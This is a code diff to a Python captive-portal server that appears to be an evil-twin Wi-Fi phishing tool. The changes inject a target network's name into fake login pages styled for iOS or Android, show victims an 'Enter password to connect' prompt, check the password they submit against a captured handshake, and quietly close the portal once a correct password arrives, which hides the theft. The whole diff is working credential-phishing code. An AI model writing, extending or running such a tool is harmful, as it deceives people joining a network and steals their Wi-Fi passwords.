@@ -25,6 +25,7 @@ BIND_PORT = int(os.environ.get('BIND_PORT', '80'))
 HANDSHAKE_FILE = os.environ.get('HANDSHAKE_FILE', '')  # Path to handshake for verification
 VERIFY_MODE = os.environ.get('VERIFY_MODE', 'false').lower() == 'true'
 PORTAL_TEMPLATE = os.environ.get('PORTAL_TEMPLATE', '').lower()  # 'ios' or 'android' or template dir name
+TARGET_SSID = os.environ.get('TARGET_SSID', 'Wi-Fi')  # The target network name
 
 # Color codes for terminal output
 RED = '\033[0;31m'
@@ -158,17 +159,64 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
             '/check_network_status.txt',
         ]
 
+        # Determine which template to serve
+        serve_portal = False
         if self.path in captive_paths or self.path == '/':
-            # Always serve the portal - even for returning clients
+            serve_portal = True
+
+        if serve_portal:
+            # Check if this client is already verified - let them through
+            if client_ip in verified_clients:
+                # Client already verified - return 204 (no content) to let them through
+                self.send_response(204)
+                self.end_headers()
+                return
+
+            # Debug: print what's happening
+            print(f"{CYAN}[DEBUG]{NC} PORTAL_DIR={PORTAL_DIR}, path={self.path}")
+            
             # Determine which template to use based on User-Agent
             ua = self.headers.get('User-Agent', '').lower()
-            chosen = '/index.html'
-            # if specialized portal folders exist copy they will reside in portal_dir/ios or /android
-            if 'android' in ua and os.path.exists(os.path.join(PORTAL_DIR, 'android', 'index.html')):
-                chosen = '/android/index.html'
-            elif any(x in ua for x in ('iphone', 'ipad', 'ios')) and os.path.exists(os.path.join(PORTAL_DIR, 'ios', 'index.html')):
-                chosen = '/ios/index.html'
-            self.path = chosen
+            chosen_path = 'index.html'
+            
+            # Check for specialized portal folders
+            if 'android' in ua:
+                android_path = os.path.join(PORTAL_DIR, 'android', 'index.html')
+                print(f"{CYAN}[DEBUG]{NC} Checking android: {android_path}, exists={os.path.exists(android_path)}")
+                if os.path.exists(android_path):
+                    chosen_path = 'android/index.html'
+            elif any(x in ua for x in ('iphone', 'ipad', 'ios')):
+                ios_path = os.path.join(PORTAL_DIR, 'ios', 'index.html')
+                print(f"{CYAN}[DEBUG]{NC} Checking ios: {ios_path}, exists={os.path.exists(ios_path)}")
+                if os.path.exists(ios_path):
+                    chosen_path = 'ios/index.html'
+            
+            # Try to serve the chosen file
+            file_path = os.path.join(PORTAL_DIR, chosen_path)
+            print(f"{CYAN}[DEBUG]{NC} Serving: {file_path}, exists={os.path.exists(file_path)}")
+            if os.path.exists(file_path):
+                self.path = '/' + chosen_path
+            else:
+                # Check subdirectories for index.html as fallback
+                for subdir in ['android', 'ios', '']:
+                    if subdir:
+                        check_path = os.path.join(PORTAL_DIR, subdir, 'index.html')
+                    else:
+                        check_path = os.path.join(PORTAL_DIR, 'index.html')
+                    print(f"{CYAN}[DEBUG]{NC} Checking fallback: {check_path}, exists={os.path.exists(check_path)}")
+                    if os.path.exists(check_path):
+                        self.path = '/' + (subdir + '/index.html' if subdir else 'index.html')
+                        break
+                else:
+                    # Ultimate fallback - serve a basic HTML
+                    print(f"{CYAN}[DEBUG]{NC} Serving inline HTML fallback")
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html')
+                    html = '<html><head><meta charset="UTF-8"><title>Wi-Fi</title></head><body style="background:#0d1117;color:#fff;font-family:Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;"><div style="text-align:center;"><h2>Wi-Fi</h2><p>Enter password to connect</p></div></body></html>'
+                    self.send_header('Content-Length', str(len(html)))
+                    self.end_headers()
+                    self.wfile.write(html.encode())
+                    return
 
             with client_lock:
                 if client_ip in submitted_clients:
@@ -176,11 +224,30 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
                 else:
                     print(f"{CYAN}[{timestamp}]{NC} {WHITE}New client:{NC} {client_ip}")
 
-        # Check if file exists, otherwise serve index.html
-        file_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
-        if not os.path.exists(file_path):
-            # fallback to default
-            self.path = '/index.html'
+        # Inject TARGET_SSID into HTML - simple direct replacement
+        print(f"{CYAN}[DEBUG] TARGET_SSID='{TARGET_SSID}'{NC}")
+        serve_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
+        print(f"{CYAN}[DEBUG] serve_path={serve_path}, exists={os.path.exists(serve_path)}{NC}")
+        if os.path.exists(serve_path) and serve_path.endswith('.html'):
+            try:
+                with open(serve_path, 'r') as f:
+                    html = f.read()
+                    print(f"{CYAN}[DEBUG] Original has NETWORK: {'NETWORK' in html}{NC}")
+                
+                # Simple direct replacement - replace NETWORK with target SSID
+                html = html.replace('NETWORK', TARGET_SSID)
+                
+                print(f"{CYAN}[DEBUG] After replace has NETWORK: {'NETWORK' in html}{NC}")
+                
+                # Serve modified HTML
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.send_header('Content-Length', str(len(html)))
+                self.end_headers()
+                self.wfile.write(html.encode())
+                return
+            except Exception as e:
+                print(f"{YELLOW}[!] SSID injection error: {e}{NC}")
 
         print(f"{CYAN}[{timestamp}]{NC} {WHITE}Page view:{NC} {client_ip} -> {self.path}")
         return super().do_GET()
@@ -295,42 +362,21 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         # Send response based on verification result
         if VERIFY_MODE and HANDSHAKE_FILE and password:
             if password_verified:
-                # CORRECT PASSWORD - show success and allow internet
+                # CORRECT PASSWORD - minimal response to close portal
+                # iOS/Android will close captive portal when they can access internet
                 redirect_html = """<!DOCTYPE html>
 <html>
 <head>
     <title>Connected</title>
-    <meta http-equiv="refresh" content="3;url=""" + REDIRECT_URL + """">
+    <meta http-equiv="refresh" content="0;url=http://captive.apple.com/generate_204">
     <style>
-        body {
-            font-family: -apple-system, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            background: #10b981;
-        }
-        .message {
-            background: white;
-            padding: 40px 60px;
-            border-radius: 12px;
-            text-align: center;
-        }
-        .checkmark {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        h2 { color: #1a1a1a; margin: 0 0 8px 0; }
-        p { color: #65676b; margin: 0; }
+        body { margin: 0; padding: 20px; font-family: -apple-system, sans-serif; text-align: center; background: #34C759; color: white; }
+        .check { font-size: 48px; }
     </style>
 </head>
 <body>
-    <div class="message">
-        <div class="checkmark">✓</div>
-        <h2>Connected Successfully!</h2>
-        <p>You now have internet access.</p>
-    </div>
+    <div class="check">✓</div>
+    <p>Connected</p>
 </body>
 </html>"""
             else:
@@ -340,49 +386,11 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
 <head>
     <title>Wrong Password</title>
     <style>
-        body {
-            font-family: -apple-system, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            background: #f0f2f5;
-        }
-        .message {
-            background: white;
-            padding: 40px 60px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 320px;
-        }
-        .error-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        h2 { color: #dc2626; margin: 0 0 8px 0; }
-        p { color: #65676b; margin: 0 0 20px 0; }
-        .retry-btn {
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
+        body { font-family: -apple-system, sans-serif; padding: 20px; text-align: center; background: #1a1a1a; color: #ff3b30; }
     </style>
 </head>
 <body>
-    <div class="message">
-        <div class="error-icon">✗</div>
-        <h2>Incorrect Password</h2>
-        <p>The password you entered is incorrect. Please try again.</p>
-        <a href="/" class="retry-btn">Try Again</a>
-    </div>
+    <p>Incorrect password</p>
 </body>
 </html>"""
         else:
